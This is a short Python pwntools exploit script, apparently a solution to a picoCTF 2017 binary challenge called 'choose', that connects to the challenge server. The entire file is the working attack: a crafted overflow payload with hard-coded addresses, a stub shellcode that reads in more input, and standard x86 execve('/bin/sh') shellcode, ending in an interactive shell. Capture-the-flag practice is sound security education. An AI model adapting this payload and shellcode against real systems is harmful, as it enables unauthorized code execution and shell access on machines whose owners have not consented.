#!/usr/bin/env python

from pwn import *

#io = process("./choose")
#gdb.attach(io)
io = remote("shell2017.picoctf.com",17813)

input_str = 0x080ed045
big_payload = 0x080ec000 # O locatie rwx din memorie destul de mare


# call readInput
# ret
small_shellcode = "\xe8\xf2\xbd\xf5\xff\xc3"

# shellcode
big_shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"

payload1 = "c\n"*11  + "a\n"*10 + "J"*2 + p32(input_str) + p32(big_payload) + "J" + "\n" + "a\n"*38 + "a" + small_shellcode + "\n"

io.send(payload1)
io.sendline(big_shellcode)

io.interactive()
